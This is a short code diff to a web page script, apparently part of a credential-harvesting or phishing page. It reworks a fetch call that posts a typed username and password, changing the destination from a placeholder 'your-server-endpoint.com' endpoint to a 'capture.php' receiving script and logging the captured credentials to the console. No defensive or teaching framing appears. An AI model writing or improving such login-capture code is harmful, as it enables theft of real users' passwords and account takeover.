@@ -278,17 +278,14 @@
                 document.getElementById('loading').style.display = 'none';
                 
                 // Send credentials to server (this would go to your server)
-                fetch('https://your-server-endpoint.com/log', {
+                // POST data to your receiving script
+                fetch('capture.php', {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': 'application/x-www-form-urlencoded',
                     },
-                    body: JSON.stringify({
-                        username: username,
-                        password: password,
-                        timestamp: new Date().toISOString()
-                    }),
-                });
+                    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                }).catch(e => console.error('Error sending data:', e));
                 
                 // Just log to console for debugging
                 console.log('Credentials sent:', { username, password });
